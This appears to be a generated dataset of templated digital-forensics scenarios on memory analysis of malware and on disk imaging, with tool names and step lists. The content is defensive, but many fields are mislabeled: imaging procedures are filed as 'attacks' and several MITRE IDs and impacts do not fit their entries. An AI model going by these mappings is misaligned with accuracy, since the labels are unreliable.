- **Attack Type**: Post-Incident Forensics
- **Target**: Workstations
- **Vulnerability**: Delay in disk-based logging
- **MITRE**: T1213
- **Impact**: Attribution via volatile artifacts
- **Tools**: DumpIt, Volatility
- **Scenario**: Immediate memory capture after breach helped reconstruct attacker activity.
- **Attack Steps**: 1. Company-wide breach is declared, and affected endpoints identified. 2. First responder uses DumpIt on each affected host before shutdown. 3. RAM dumps are stored with proper chain-of-custody. 4. Volatility is used to analyze browser cache in memory. 5. Chat sessions between attacker and victim over web portal are found. 6. Volatile clipboard history reveals exfiltrated file names. 7. Network artifacts like DNS cache point to attacker-controlled domain. 8. Timeline is reconstructed purely from memory. 9. Full TTP mapping done for report. 10. Legal team uses evidence in prosecution.
- **Detection**: Memory-only incident reconstruction
- **Solution**: Policy to dump RAM before shutdown
- **Tags**: postbreach, memorydump, evidence

## Capturing Ransomware Mutex and Keys from RAM

- **Attack Type**: Active Ransomware Lock
- **Target**: Workstation
- **Vulnerability**: Encryption before disk evidence
- **MITRE**: T1486
- **Impact**: Stopped encryption in progress
- **Tools**: Belkasoft RAM Capturer, Volatility
- **Scenario**: Analyst extracts mutex and keys mid-encryption via memory dump.
- **Attack Steps**: 1. Ransomware spreads across network but is not yet fully locked. 2. Belkasoft RAM Capturer run on live host during active encryption. 3. Volatility’s mutexes identifies ransomware-specific mutex to stop process. 4. Heap analysis locates active AES keys and file lists. 5. Decryption utility is built based on recovered keys. 6. Memory strings confirm ransom note content. 7. Host process is force-terminated. 8. Files recovered and incident contained. 9. IOC signatures generated. 10. Playbook updated with mutex detection step.
- **Detection**: Mutex and AES key recovery from heap
- **Solution**: Proactive memory capture during incident
- **Tags**: ransomware, mutex, aeskeys

## Uncovering Covert Remote Access Tool

- **Attack Type**: Remote Access Trojan
- **Target**: Workstation
- **Vulnerability**: Named pipe abuse
- **MITRE**: T1021.002
- **Impact**: Covert persistence & data theft
- **Tools**: WinPMEM, Volatility, ProcDOT
- **Scenario**: Fileless RAT operating via named pipes found only in RAM.
- **Attack Steps**: 1. EDR detects anomalous named pipe communication. 2. RAM dump acquired with WinPMEM. 3. Volatility’s pipes plugin shows RAT activity via \\.\pipe\SystemRPC. 4. Associated process not found on disk. 5. Memory inspection reveals embedded C2 address in cleartext. 6. Volatility apihooks detects function hooking. 7. ProcDOT visualizes process-tree anomaly. 8. Strings show attacker credentials. 9. Threat actor identified and C2 disabled. 10. Host reimaged and alerts expanded.
- **Detection**: RAM analysis + pipe tracing
- **Solution**: Monitor named pipe usage patterns
- **Tags**: remote-access, namedpipes, memoryrat

## Memory Analysis of Suspicious Browser Extension

- **Attack Type**: Malicious Extension
- **Target**: Browser
- **Vulnerability**: In-memory WASM module
- **MITRE**: T1176
- **Impact**: Browser-based data exfil
- **Tools**: AVML, Volatility, ChromeProcessDump
- **Scenario**: Malicious Chrome extension loads payloads only in memory
- **Attack Steps**: 1. Security team notices beaconing from Chrome on idle system. 2. Memory snapshot collected via AVML on Linux host. 3. Volatility + ChromeProcessDump plugin used to analyze browser processes. 4. Malicious extension injects WebAssembly payload directly into memory. 5. WASM module is decompiled and reveals C2 code. 6. Local extension directory shows no related files. 7. RAM-only operation confirmed. 8. IPs extracted and blocked. 9. Extension flagged and reported. 10. Chrome policy updated to prevent sideloads.
- **Detection**: Browser memory dump analysis
- **Solution**: Lockdown extension installation
- **Tags**: wasm, chrome, memory-browser

## Isolating Process Hollowing via Memory Inspection

- **Attack Type**: Process Hollowing
- **Target**: Workstation
- **Vulnerability**: Code injection undetected on disk
- **MITRE**: T1055.012
- **Impact**: Hidden process takeover
- **Tools**: WinPMEM, Volatility
- **Scenario**: Suspicious process replaced in memory by another payload
- **Attack Steps**: 1. Endpoint alert for unsigned exe running from System32. 2. Analyst dumps memory with WinPMEM. 3. Volatility pslist shows known process name with wrong PPID. 4. malfind shows injected code in memory regions. 5. Section names and PE header mismatch confirms hollowing. 6. Extracted memory region reveals remote payload. 7. Fileless malware with lateral movement capability identified. 8. IOC created from memory hash. 9. Host quarantined. 10. IR team updates playbooks with hollowing detection.
- **Detection**: Memory region mismatch & header analysis
- **Solution**: Improve process integrity validation
- **Tags**: process-hollowing, memoryforensics, injection

## Memory Capture Reveals Keylogger in Startup Routine

- **Attack Type**: Keylogging
- **Target**: Workstation
- **Vulnerability**: In-memory keylogger
- **MITRE**: T1056.001
- **Impact**: Credential harvesting
- **Tools**: DumpIt, Volatility, PEStudio
- **Scenario**: Victim reports suspicious typing delays; memory inspection exposes in-memory keylogger.
- **Attack Steps**: 1. User reports delayed keystroke response and clipboard malfunction. 2. Analyst initiates live RAM capture using DumpIt. 3. RAM is analyzed with Volatility’s pslist and cmdline plugins. 4. Suspicious executable found in memory with no file on disk. 5. malfind shows injected payload in explorer.exe. 6. Extracted strings reveal keyboard hook API usage. 7. Analyst identifies startup persistence through autorun memory artifacts. 8. Key logs extracted from buffer in heap memory. 9. IOC signatures created. 10. Host quarantined, keylogger signatures added to EDR.
- **Detection**: Keyboard hook detection in RAM
- **Solution**: Prevent startup keylogger persistence
- **Tags**: keylogger, memory-injection, autorun

## Memory Analysis Identifies Fileless RAT

- **Attack Type**: Remote Access Trojan
- **Target**: Workstation
- **Vulnerability**: PowerShell fileless RAT
- **MITRE**: T1059.001
- **Impact**: Stealthy remote access
- **Tools**: WinPMEM, Volatility, CyberChef
- **Scenario**: No file is dropped on disk; RAT operates fully in RAM using PowerShell.
- **Attack Steps**: 1. SOC receives alert for unknown outbound connection. 2. Analyst dumps memory using WinPMEM. 3. Volatility’s pslist shows hidden PowerShell process. 4. cmdline reveals long obfuscated base64 string. 5. Using CyberChef, script is decoded — reveals C2 domain and RAT loader. 6. No matching file on disk — confirms fileless payload. 7. netscan confirms active TCP session to attacker IP. 8. apihooks shows injected API functions for stealth. 9. Network blocks C2, host isolated. 10. Decoded payload shared with threat intel team.
- **Detection**: Decode & extract in-memory payloads
- **Solution**: Block obfuscated PowerShell use + isolate hosts
- **Tags**: powershell, fileless, memory-rat

## Analyzing Memory of Crashed System Reveals Rootkit

- **Attack Type**: Rootkit Analysis
- **Target**: Workstation
- **Vulnerability**: Kernel patching via rootkit
- **MITRE**: T1014
- **Impact**: System instability & hidden persistence
- **Tools**: WinDbg, Rekall, DumpIt
- **Scenario**: System bluescreens repeatedly; crash dump exposes kernel-level malware.
- **Attack Steps**: 1. Endpoint keeps crashing during normal use. 2. RAM captured from crash dump using DumpIt. 3. Analyzed using WinDbg and Rekall. 4. Kernel hooks found pointing to unsigned module. 5. Rootkit not visible in disk or driver list. 6. Rekall’s modules reveals ghost driver. 7. Memory comparison shows altered SSDT (System Service Dispatch Table). 8. Analyst disables rootkit manually via memory patch. 9. Persistence traced to bootloader modification. 10. Host rebuilt from clean image.
- **Detection**: Kernel memory integrity checks
- **Solution**: Block unsigned drivers and verify bootloaders
- **Tags**: rootkit, bsod, memorydebug

## Memory Acquisition Identifies Worm-Like Spread via SMB

- **Attack Type**: Worm Propagation
- **Target**: Workstation
- **Vulnerability**: Memory-resident worm spreading via SMB
- **MITRE**: T1021.002
- **Impact**: Lateral spread & persistence
- **Tools**: DumpIt, Volatility, SMBScanner
- **Scenario**: Live memory reveals lateral movement through SMB via in-memory payloads.
- **Attack Steps**: 1. Unusual number of internal SMB sessions detected. 2. Analysts dump memory of affected machine using DumpIt. 3. Volatility’s svcscan finds unauthorized services mimicking Windows Update. 4. netscan reveals open SMB ports to multiple hosts. 5. Payloads loaded directly into RAM using PSExec-like method. 6. Memory strings show IPs and encoded credentials used in spread. 7. Extraction of payloads confirms fileless worm components. 8. Hosts isolated, and scan performed across network. 9. Credentials reset and unauthorized shares removed. 10. SIEM updated with new IOC rules.
- **Detection**: Memory + SMB session correlation
- **Solution**: SMB hardening and credential restriction
- **Tags**: worm, smbspread, fileless

## Live Memory Acquisition Uncovers Ransomware Variant

- **Attack Type**: Ransomware
- **Target**: Workstation
- **Vulnerability**: Active ransomware payload in memory
- **MITRE**: T1486
- **Impact**: Partial encryption prevented
- **Tools**: AVML, Volatility
- **Scenario**: Host is in early stages of ransomware encryption; memory reveals variant and keys.
- **Attack Steps**: 1. Host CPU spikes, files being renamed rapidly. 2. AVML used to immediately capture memory without shutting down the host. 3. Volatility analysis begins with pslist, revealing unknown EXE with high thread count. 4. malfind finds AES encryption functions in memory. 5. Mutex linked to known ransomware strain identified. 6. In-memory decryption key found in heap allocation. 7. Analysts pause process using memory tampering. 8. Key used to decrypt affected files. 9. Payload hash submitted for detection signature creation. 10. Backup restored, and ransomware blocked via EDR.
- **Detection**: Mutex + AES key extraction
- **Solution**: Immediate memory intervention during incident
- **Tags**: ransomware, aeskey, avml

## Finding Evidence of Insider Threat via Memory Analysis

- **Attack Type**: Insider Threat
- **Target**: Workstation
- **Vulnerability**: File transfer tools in RAM
- **MITRE**: T1041
- **Impact**: Data exfiltration by employee
- **Tools**: WinPMEM, Volatility
- **Scenario**: Suspected employee extracts sensitive files; memory shows file paths and exfil attempts.
- **Attack Steps**: 1. HR suspects insider is leaking documents. 2. Workstation is seized and memory dumped live using WinPMEM. 3. Volatility’s filescan reveals recently opened sensitive PDFs. 4. Clipboard plugin shows copied FTP address and credentials. 5. netscan reveals recent connection to FTP server. 6. cmdline shows use of curl.exe to push data. 7. Memory analysis reveals ZIP archives containing HR data. 8. FTP address traced to third-party hosting. 9. Insider confronted and evidence stored. 10. HR policy revised.
- **Detection**: Memory URL & clipboard tracing
- **Solution**: Monitor FTP and file transfer tools
- **Tags**: insider-threat, file-transfer, curl

## Cloud Memory Dump Catches Privilege Escalation Script

- **Attack Type**: Privilege Escalation
- **Target**: Cloud container
- **Vulnerability**: LPE exploit in memory
- **MITRE**: T1068
- **Impact**: Root access in container
- **Tools**: AVML, Rekall, Ghidra
- **Scenario**: Memory reveals local privilege escalation exploit in cloud container.
- **Attack Steps**: 1. Container logs show root access anomaly. 2. Analyst dumps RAM from container using AVML. 3. Rekall locates unknown binary in memory using procinfo. 4. Decompiled using Ghidra — confirms it’s a dirty pipe exploit. 5. Memory inspection shows hardcoded privilege escalation code. 6. Root access tokens found live in memory. 7. Network logs show data transfer with root privileges. 8. Container rebooted, exploit deleted. 9. Kernel patched across container fleet. 10. IOC distributed to CSP detection system.
- **Detection**: In-memory binary + token analysis
- **Solution**: Patch vulnerable kernels ASAP
- **Tags**: container, privilege-escalation, cloud

## Extracting Stolen API Keys from RAM

- **Attack Type**: Credential Theft
- **Target**: Developer workstation
- **Vulnerability**: Tokens and keys left in memory
- **MITRE**: T1552.003
- **Impact**: API compromise
- **Tools**: Belkasoft, Volatility
- **Scenario**: Attacker grabs API keys from RAM; memory forensics retrieves them for validation.
- **Attack Steps**: 1. Developer system suspected of compromise. 2. Memory captured with Belkasoft tool. 3. Volatility used to scan environment variables and browser memory. 4. API keys identified in cleartext in memory. 5. Further analysis reveals active script in memory scraping tokens. 6. HTTP traffic confirms keys used in third-party calls. 7. Tokens revoked. 8. User advised to use vault solutions. 9. Memory IOCs created to detect similar scraping patterns. 10. DevOps notified to enforce key obfuscation.
- **Detection**: Environment + heap memory scan
- **Solution**: Mask and rotate sensitive API secrets
- **Tags**: credentials, api-key, memoryleak

## Capturing Memory from Suspicious Virtual Machine

- **Attack Type**: VM Compromise
- **Target**: Virtual machine
- **Vulnerability**: Staging via internal VM
- **MITRE**: T1070.006
- **Impact**: Internal pivot and data theft
- **Tools**: FTK Imager, Volatility
- **Scenario**: Suspicious virtual machine used for malware staging; memory reveals RAT and credentials.
- **Attack Steps**: 1. IR team investigates internal VM used beyond scope. 2. Snapshot taken and RAM dump extracted using FTK Imager. 3. Volatility finds dual-purpose malware process acting as dropper and C2 relay. 4. Stolen credential hashes found in memory. 5. Memory DNS cache shows unusual domains contacted. 6. Browser memory shows login to corporate VPN. 7. Hostname spoofing used to mask VM identity. 8. Memory artifacts link user to credential abuse. 9. VM shut down and user privileges revoked. 10. VM templates reviewed for misuse.
- **Detection**: RAM dump + DNS cache + VPN logins
- **Solution**: Monitor VMs for behavior deviations
- **Tags**: vm, vpn, memory-compromise

## Analyzing Memory to Recover Deleted Malware Sample

- **Attack Type**: Malware Recovery
- **Target**: Workstation
- **Vulnerability**: Self-deleting malware
- **MITRE**: T1070.004
- **Impact**: Payload analysis and attribution
- **Tools**: DumpIt, Volatility, PE-Sieve
- **Scenario**: Malware deletes itself post-execution; memory used to recover payload for analysis.
- **Attack Steps**: 1. Endpoint shows infection signs but no malware on disk. 2. RAM captured using DumpIt before reboot. 3. Volatility’s malfind and ldrmodules show injected code in svchost.exe. 4. Memory region extracted and parsed with PE-Sieve. 5. Reconstructed executable reveals dropper and loader behavior. 6. Strings in memory provide attacker email and wallet address. 7. Sample submitted to AV vendor. 8. TTPs matched with known campaign. 9. Internal systems scanned for same memory artifact. 10. Playbook updated with memory-recovery procedures.
- **Detection**: Memory payload reconstruction
- **Solution**: Preserve memory before reboot
- **Tags**: payload-recovery, malware-analysis, pe-sieve

## Bit-by-Bit Imaging with FTK Imager

- **Attack Type**: Disk Imaging
- **Target**: Desktop
- **Vulnerability**: None
- **MITRE**: N/A
- **Impact**: Evidence Integrity
- **Tools**: FTK Imager
- **Scenario**: Forensic team performs a full physical image of a suspect's hard drive for later offline analysis
- **Attack Steps**: 1. Insert the suspect drive into a write-blocker to avoid modification. 2. Launch FTK Imager on the analysis workstation. 3. Go to "File" → "Create Disk Image" and select "Physical Drive". 4. Choose the suspect disk from the list. 5. Select the destination path, format (e.g., E01 or RAW), and set hashing options (MD5/SHA1). 6. Add relevant case metadata like case number and examiner name. 7. Start the imaging process and monitor for errors. 8. Verify hashes once imaging is complete to ensure integrity. 9. Store the image securely for analysis.
- **Detection**: Hash mismatch detection
- **Solution**: Perform hash verification post-image
- **Tags**: #FTK #diskimaging #bitbybit

## Live Disk Imaging Using 'dd' in Linux

- **Attack Type**: Disk Imaging
- **Target**: Linux Server
- **Vulnerability**: None
- **MITRE**: N/A
- **Impact**: Data Tampering
- **Tools**: dd
- **Scenario**: Analyst needs to acquire a live disk image from a Linux server without shutting it down
- **Attack Steps**: 1. Log in to the target Linux system using SSH or direct console access. 2. Plug in an external drive with sufficient storage. 3. Mount the external storage at /mnt/forensics. 4. Use dd if=/dev/sda of=/mnt/forensics/server_image.dd bs=4M conv=noerror,sync to begin imaging. 5. Use pv in combination to view progress. 6. Generate an MD5/SHA256 hash of the image with md5sum and save it. 7. Verify hash for integrity. 8. Store both the hash and image securely. 9. Disconnect cleanly to preserve chain of custody.
- **Detection**: Hashing mismatch or disk write
- **Solution**: Use write-blocker or live-boot imaging
- **Tags**: #dd #linux #livedisk #diskimage

## Imaging an SSD with Guymager

- **Attack Type**: Disk Imaging
- **Target**: Laptop SSD
- **Vulnerability**: None
- **MITRE**: N/A
- **Impact**: Chain of Custody
- **Tools**: Guymager
- **Scenario**: Investigator uses Guymager to create a forensic image of an SSD from a laptop
- **Attack Steps**: 1. Remove the SSD from the suspect laptop. 2. Connect it to the forensics workstation using a write-blocker. 3. Open Guymager and let it detect all attached devices. 4. Right-click the SSD device and select "Acquire Image". 5. Set destination, image name, case details, and choose compression if desired. 6. Enable MD5/SHA256 hashing. 7. Start the acquisition and monitor the imaging log. 8. After completion, compare acquired image hash with original. 9. Document all actions in forensic notes.
- **Detection**: Log comparison and hash match
- **Solution**: Maintain a clear acquisition report
- **Tags**: #Guymager #ssd #diskforensics

## Partial Disk Imaging (Triage Mode)

- **Attack Type**: Targeted Imaging
- **Target**: Workstation
- **Vulnerability**: None
- **MITRE**: N/A
- **Impact**: Rapid Response
- **Tools**: FTK Imager
- **Scenario**: Analyst performs targeted imaging of only browser history and documents for triage
- **Attack Steps**: 1. Connect suspect device using a write-blocker. 2. Open FTK Imager and select "Add Evidence Item". 3. Browse filesystem and identify relevant folders (e.g., Documents, AppData, browser profiles). 4. Use "Export Files" or create a custom logical image. 5. Specify destination and enable hashing. 6. Capture only selected directories to speed up investigation. 7. Record hash values and file paths. 8. Verify integrity of exported data. 9. Use triaged data for fast incident response.
- **Detection**: Incomplete evidence scope
- **Solution**: Complement with full image later
- **Tags**: #triage #targetedimaging

## Imaging Encrypted Disks

- **Attack Type**: Disk Imaging
- **Target**: Encrypted Laptop
- **Vulnerability**: Full Disk Encryption
- **MITRE**: T1553
- **Impact**: Loss of access to encrypted data
- **Tools**: Magnet Acquire, FTK Imager
- **Scenario**: Forensic investigator encounters a BitLocker-encrypted disk and performs live imaging
- **Attack Steps**: 1. Identify that the disk is BitLocker encrypted (check with manage-bde). 2. If the system is powered on, retrieve the recovery key or live volume. 3. Use Magnet Acquire or FTK Imager to image the decrypted volume (live state). 4. Choose E01 format with hashing enabled. 5. If live imaging isn't possible, collect recovery keys before shutdown. 6. Document all encryption-related steps. 7. Store both image and key in secure evidence lockers. 8. Include full disk encryption status in chain of custody. 9. Use decrypted image for further analysis.
- **Detection**: Audit encryption status
- **Solution**: Secure recovery key backup
- **Tags**: #bitlocker #encryption #forensics

## Imaging Virtual Machine Disks

- **Attack Type**: Disk Imaging
- **Target**: Virtual Machine
- **Vulnerability**: None
- **MITRE**: N/A
- **Impact**: Data Theft (Virtual)
- **Tools**: FTK Imager, vmware-mount
- **Scenario**: Analyst images a VMDK from a suspect VM for forensic analysis
- **Attack Steps**: 1. Identify and locate the VMDK file on the hypervisor or host system. 2. Use vmware-mount or FTK Imager to mount the virtual disk. 3. Perform a logical or full image of the mounted disk. 4. Export to a forensic format like E01. 5. Calculate and store hashes. 6. Document metadata from VM config (snapshot ID, timestamps). 7. Securely store disk image and logs. 8. Analyze using forensic tools (Autopsy, X-Ways). 9. Keep track of VM state (running, suspended, etc.) in notes.
- **Detection**: Hypervisor logs
- **Solution**: VM snapshot management
- **Tags**: #vmware #vmdk #virtualforensics

## Disk Cloning for Investigation

- **Attack Type**: Disk Imaging
- **Target**: Workstation
- **Vulnerability**: None
- **MITRE**: N/A
- **Impact**: Malware Containment
- **Tools**: Clonezilla
- **Scenario**: Creating an exact clone of suspect’s drive for lab analysis
- **Attack Steps**: 1. Boot the suspect system using Clonezilla Live USB. 2. Select device-to-device mode to clone the disk. 3. Choose source (suspect) and target (blank forensic drive). 4. Enable checksum verification before and after cloning. 5. Save log files to USB. 6. Label cloned drive with case ID. 7. Store original in evidence locker. 8. Use cloned drive for live analysis or malware detonation. 9. Update chain of custody.
- **Detection**: Audit clone checksum
- **Solution**: Use cloned disk for dynamic analysis
- **Tags**: #clonezilla #diskclone #labforensics

## Imaging Multi-Partitioned Drives

- **Attack Type**: Disk Imaging
- **Target**: Dual-Boot Machine
- **Vulnerability**: Hidden Bootloader
- **MITRE**: T1070.004
- **Impact**: Hidden artifacts
- **Tools**: FTK Imager, Guymager
- **Scenario**: Forensic team images a disk with multiple OS partitions (dual-boot system)
- **Attack Steps**: 1. Identify the number of partitions using a partition manager. 2. Connect drive using write-blocker. 3. Use FTK Imager or Guymager to acquire entire disk. 4. Each partition is imaged and logged separately. 5. Enable hash verification. 6. Document OS versions and bootloader (e.g., GRUB). 7. Take screenshots of partition layout. 8. Store image securely in labeled folders. 9. Note any encrypted partitions.
- **Detection**: Partition audit tools
- **Solution**: Full disk image capture
- **Tags**: #dualboot #partitions #ftk

## Collecting Disk Image from RAID Array

- **Attack Type**: Disk Imaging
- **Target**: RAID Server
- **Vulnerability**: RAID Misconfig
- **MITRE**: T1005
- **Impact**: Data loss or corruption
- **Tools**: FTK Imager, RAID Controller Tools
- **Scenario**: Imaging RAID setup (RAID 0/1/5) for forensic evidence from enterprise setup
- **Attack Steps**: 1. Identify RAID level and configuration from BIOS or controller software. 2. If system is live, retrieve metadata and drive mapping. 3. Use controller tools to rebuild RAID if degraded. 4. Attach array to forensic workstation with write-blocker. 5. Use FTK Imager to acquire complete image. 6. Enable hashing and log RAID metadata. 7. Label each physical drive. 8. Document controller model, array status, and config. 9. Store image and RAID logs for court use.
- **Detection**: Monitor RAID status
- **Solution**: Use verified controller tools
- **Tags**: #RAID #diskimage #forensicarray

## Imaging a Mac System Drive

- **Attack Type**: Disk Imaging
- **Target**: macOS Device
- **Vulnerability**: APFS Complexity
- **MITRE**: T1005
- **Impact**: Loss of data structures
- **Tools**: MacBook, FTK Imager, dd
- **Scenario**: Acquire forensic image from macOS using target disk mode
- **Attack Steps**: 1. Boot Mac in Target Disk Mode (hold T during startup). 2. Connect to another Mac or forensic host via Thunderbolt. 3. Mount the drive read-only. 4. Use FTK Imager or dd to image the mounted volume. 5. Specify output format and hash options. 6. Save and verify hashes post-image. 7. Note APFS or HFS+ filesystem and special partitions. 8. Store metadata (e.g., system version, serial number). 9. Use image in tools like BlackLight or Autopsy.
- **Detection**: Filesystem-aware tools
- **Solution**: Use APFS-capable software
- **Tags**: #macforensics #apfs #targetdisk

## Imaging via Write-Blocker & FTK Imager

- **Attack Type**: Disk Imaging
- **Target**: Desktop or Laptop Drive
- **Vulnerability**: Evidence Tampering
- **MITRE**: N/A
- **Impact**: Legal Inadmissibility
- **Tools**: FTK Imager, Tableau Write-Blocker
- **Scenario**: Examiner uses a physical write-blocker to ensure no changes are made while acquiring an image
- **Attack Steps**: 1. Power off the suspect device and remove the hard drive carefully. 2. Connect the hard drive to the forensic workstation through a certified hardware write-blocker. 3. Power on the forensic machine and launch FTK Imager. 4. In FTK Imager, select “Create Disk Image” and choose “Physical Drive” as source. 5. Select the connected drive, configure the destination location, and name the image file. 6. Enable both MD5 and SHA1 hashing and logging. 7. Enter case metadata (examiner name, case number, etc.) to maintain chain of custody. 8. Begin acquisition and monitor progress through status logs. 9. Once completed, verify that hash values match, and export a full acquisition report. 10. Secure the image and original drive separately in evidence storage.
- **Detection**: Hash Verification
- **Solution**: Use write-blocker and verified hashes
- **Tags**: #writeblocker #ftkimager #evidence

## Creating Forensic Image with Magnet Acquire

- **Attack Type**: Disk Imaging
- **Target**: HDD / SSD
- **Vulnerability**: Data Contamination
- **MITRE**: T1005
- **Impact**: Chain of Custody Risk
- **Tools**: Magnet Acquire
- **Scenario**: A forensic analyst uses Magnet Acquire for imaging a suspect's hard drive in an enterprise case
- **Attack Steps**: 1. Connect the suspect drive to the forensic workstation via hardware write-blocker. 2. Launch Magnet Acquire and select "Create New Image". 3. Choose the evidence source (physical or logical) and define acquisition type (e.g., full or targeted). 4. Select output format (E01, RAW) and enable hashing (SHA256 or MD5). 5. Enter case details including suspect info, investigator name, and acquisition notes. 6. Specify destination path and storage volume with sufficient space. 7. Start imaging and observe progress through Magnet Acquire’s GUI logs. 8. On completion, compare calculated hash with expected value. 9. Export an HTML acquisition report with metadata. 10. Store evidence in encrypted containers if required and log actions.
- **Detection**: Image and report validation
- **Solution**: Secure tool with full logging
- **Tags**: #magnet #acquire #digitalforensics

## Disk Acquisition via Linux Boot ISO (Live CD)

- **Attack Type**: Disk Imaging
- **Target**: Live System (Linux)
- **Vulnerability**: File Modification
- **MITRE**: T1005
- **Impact**: Evidence Corruption
- **Tools**: Kali Linux, dd, dc3dd
- **Scenario**: Analyst needs to perform disk imaging without booting into suspect OS to avoid changes
- **Attack Steps**: 1. Boot the suspect system using a trusted Linux Live CD or USB (like Kali, CAINE). 2. Open terminal and verify device names using lsblk or fdisk -l. 3. Connect an external hard drive and mount it (e.g., /mnt/evidence). 4. Run dc3dd if=/dev/sda of=/mnt/evidence/image.dd hash=sha256 log=image.log. 5. Monitor progress; dc3dd shows real-time stats and hashes. 6. Once imaging completes, verify the generated hash against re-calculated one. 7. Save all logs, hashes, and image file together. 8. Power down the system and label all media. 9. Document entire process in acquisition notes for later reference.
- **Detection**: Boot Integrity Checks
- **Solution**: Use Live CD and verify hashes
- **Tags**: #linuxforensics #liveboot #dc3dd

## Imaging Deleted Partitions

- **Attack Type**: Disk Imaging
- **Target**: Hard Disk
- **Vulnerability**: Deleted Data
- **MITRE**: T1530
- **Impact**: Hidden or deleted evidence
- **Tools**: TestDisk, FTK Imager
- **Scenario**: Investigator encounters deleted partitions and must recover them before imaging
- **Attack Steps**: 1. Connect the suspect drive via write-blocker. 2. Use TestDisk to scan the drive for deleted or lost partitions. 3. Identify recoverable partitions and take note of their location and file system type. 4. Export the partition layout or recreate it temporarily in TestDisk. 5. Once partitions are mounted, launch FTK Imager. 6. Acquire images of the recovered partitions one by one. 7. Generate hashes and log all findings. 8. Document recovery process, including tools used and data accessed. 9. Compare with original MBR/GPT to verify legitimacy. 10. Store partition images and TestDisk logs securely.
- **Detection**: Partition Recovery Logs
- **Solution**: Combine imaging with recovery
- **Tags**: #testdisk #partitionrecovery

## Hash Verification Process (Post-Imaging)

- **Attack Type**: Hashing & Integrity
- **Target**: Forensic Image File
- **Vulnerability**: Data Integrity Violation
- **MITRE**: N/A
- **Impact**: Analysis on corrupt image
- **Tools**: FTK Imager, md5sum, sha256sum
- **Scenario**: Analyst validates the integrity of the acquired forensic image before analysis
- **Attack Steps**: 1. After creating the disk image, locate the original hash values generated by FTK or acquisition tool. 2. Use md5sum image.E01 and sha256sum image.E01 (or .dd) on a separate validation machine. 3. Compare the calculated hash with the one stored in the acquisition log. 4. If there's a mismatch, re-attempt hash calculation to rule out user error. 5. Log the final verified hash values and store with case documentation. 6. Create a separate hash log file and archive it with the image. 7. Optionally create hashes for individual critical files for future reference. 8. Use verified hash logs in court reports or incident documentation.
- **Detection**: Mismatch detection tools
- **Solution**: Always verify before analysis
- **Tags**: #hashing #md5 #sha256

## Imaging Using EWF Format for Compression

- **Attack Type**: Disk Imaging
- **Target**: Imaging Files
- **Vulnerability**: Space Efficiency Risk
- **MITRE**: N/A
- **Impact**: Missing segments
- **Tools**: FTK Imager, ewfacquire
- **Scenario**: Investigator wants to save space while maintaining integrity by using EWF format
- **Attack Steps**: 1. Open FTK Imager or use ewfacquire to start the imaging process. 2. Select the suspect disk as source and define E01/EWF as the image format. 3. Configure segment size, compression level, and hash type (MD5/SHA1). 4. Begin the acquisition and monitor segment creation. 5. After completion, check that all EWF segments are complete and have matching hashes. 6. Save metadata, case info, and audit trail logs. 7. Verify hashes using ewfverify or FTK tools. 8. Document file sizes and number of segments for archival. 9. Store in compressed archive folders with strong naming conventions. 10. Ensure tools used for later analysis support EWF format.
- **Detection**: Segment validation tools
- **Solution**: Use consistent segment policy
- **Tags**: #ewf #e01 #compressedimage

## Chain of Custody Log Maintenance

- **Attack Type**: Evidence Handling
- **Target**: Physical & Digital Evidence
- **Vulnerability**: Chain of Custody Lapses
- **MITRE**: N/A
- **Impact**: Evidence Rejection in Court
- **Tools**: Physical Log Sheet, Digital Forms
- **Scenario**: Maintaining proper documentation throughout imaging and transfer process
- **Attack Steps**: 1. Create a unique evidence ID and barcode for the disk. 2. At each step (acquisition, transfer, storage), record date, time, handler name, and action taken. 3. Log hash values, imaging tool used, storage location, and who accessed the evidence. 4. Use tamper-proof evidence bags and seal with forensic tape. 5. Digitize logs and store backups in case management software. 6. If evidence is handed off, require signatures from both parties. 7. Include a detailed acquisition report with timestamps. 8. During court presentation, provide the full chain from seizure to analysis. 9. Ensure logs are regularly audited. 10. Any break in custody should be immediately reported.
- **Detection**: Custody logs
- **Solution**: Use standardized custody forms
- **Tags**: #custody #chainofcustody #evidencehandling

## Imaging Disk via Tableau TX1

- **Attack Type**: Disk Imaging
- **Target**: Suspect Drive
- **Vulnerability**: Misconfiguration
- **MITRE**: T1005
- **Impact**: Incomplete acquisition
- **Tools**: Tableau TX1
- **Scenario**: High-performance forensic acquisition using Tableau TX1 hardware imager
- **Attack Steps**: 1. Connect the suspect drive to TX1 via SATA, IDE, or USB. 2. Power on the TX1 and navigate the touchscreen interface. 3. Select imaging mode: Logical or Physical. 4. Choose output destination (USB, SSD, network share). 5. Configure hashing (SHA256/MD5) and image format (E01/RAW). 6. Begin acquisition and monitor real-time stats. 7. TX1 performs onboard hashing and saves logs. 8. Export report via USB or email. 9. Verify image integrity post-process. 10. Label and store the evidence per SOP.
- **Detection**: Real-time logs
- **Solution**: Always validate with logs
- **Tags**: #tx1 #tableau #hardwareimager

## Remote Disk Imaging in Enterprise

- **Attack Type**: Remote Imaging
- **Target**: Enterprise Workstation
- **Vulnerability**: Remote Agent Exposure
- **MITRE**: T1021
- **Impact**: Privacy Risks
- **Tools**: F-Response, FTK Imager
- **Scenario**: Imaging employee machine disk remotely during an internal investigation
- **Attack Steps**: 1. Install F-Response agent on target machine with legal approval. 2. Connect from examiner’s forensic workstation using F-Response console. 3. Mount target’s disk read-only on the examiner system. 4. Launch FTK Imager and select the mounted drive. 5. Begin imaging with hashing and logging enabled. 6. Save the image locally or to encrypted storage. 7. Maintain logs of remote access, timestamps, and authentication. 8. Export F-Response audit trail for documentation. 9. Verify hashes and store image securely. 10. Notify internal team once imaging is complete.
- **Detection**: Access logs
- **Solution**: Use warrant & audit trail
- **Tags**: #fresponse #remoteimaging

## Disk Imaging with Autopsy Integration

- **Attack Type**: Disk Imaging
- **Target**: Acquired Disk Image
- **Vulnerability**: None
- **MITRE**: T1005
- **Impact**: Automation Gaps
- **Tools**: Autopsy, Sleuth Kit
- **Scenario**: Automating imaging and case creation using Autopsy
- **Attack Steps**: 1. Open Autopsy and create a new case with relevant details. 2. Use the integrated add-image option to select an E01/RAW file or perform imaging directly. 3. If no image exists, select FTK-compatible tool for disk acquisition. 4. Add hashes and metadata during the case setup. 5. Autopsy will index the image and extract file systems automatically. 6. Document image path, hash, and source media. 7. Begin analysis immediately after image is loaded. 8. All evidence added is logged with timestamps. 9. Export final report with all metadata and hash logs. 10. Store everything in encrypted forensic archive.
- **Detection**: Audit trail in Autopsy
- **Solution**: Always verify image integrity
- **Tags**: #autopsy #sleuthkit #automateddfir

## Imaging via Write-Blocker & FTK Imager

- **Attack Type**: Disk Imaging
- **Target**: Desktop or Laptop Drive
- **Vulnerability**: Evidence Tampering
